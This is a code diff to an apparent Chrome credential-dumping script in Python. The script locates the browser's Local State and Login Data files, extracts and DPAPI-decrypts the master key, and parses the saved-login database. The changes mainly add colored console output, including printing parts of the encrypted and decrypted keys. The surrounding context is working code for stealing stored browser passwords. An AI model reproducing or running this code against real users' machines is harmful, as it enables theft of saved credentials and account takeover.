@@ -47,11 +47,11 @@ def find_local_state():
     user_profile = os.environ.get("USERPROFILE")
     
     if not user_profile:
-        print("| [{bcolors.FAIL}x{bcolors.ENDC}] Error getting user path.")
+        print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Error getting user path.")
         return ""
     
     local_state_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Local State")
-    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Local State file: {local_state_path}")
+    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Local State file: [{bcolors.WARNING}"+str(local_state_path)+f"{bcolors.ENDC}]")
     return local_state_path
 
 def find_login_data():
@@ -61,7 +61,7 @@ def find_login_data():
         return ""
     
     login_data_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
-    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Login Data file: {login_data_path}")
+    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Full path to Login Data file: [{bcolors.WARNING}"+str(login_data_path)+f"{bcolors.ENDC}]")
     return login_data_path
 
 def get_encrypted_key(local_state_path):
@@ -69,14 +69,22 @@ def get_encrypted_key(local_state_path):
         with open(local_state_path, 'r', encoding='utf-8') as file:
             local_state = json.load(file)
         encrypted_key = local_state["os_crypt"]["encrypted_key"]
+        
+        print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Retrieved encrypted key: [{bcolors.WARNING}"+str(encrypted_key)[:50]+f"...{bcolors.ENDC}]")
+        
         return encrypted_key
+        
     except (FileNotFoundError, KeyError) as e:
         print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Error: {e}")
         return ""
 
 def decrypt_key(encrypted_key):
+
     encrypted_key = base64.b64decode(encrypted_key)[5:]  # Remove "DPAPI" prefix
     decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    
+    print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Decrypted key: [{bcolors.WARNING}"+str(decrypted_key)[:50]+f"...{bcolors.ENDC}]")
+    
     return decrypted_key
 
 def login_data_parser(login_data_path, decryption_key):
@@ -105,6 +113,7 @@ def login_data_parser(login_data_path, decryption_key):
         conn.close()
         os.remove(temp_login_data_path)
         return 0
+        
     except sqlite3.Error as e:
         print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] SQL error: {e}")
         return 1
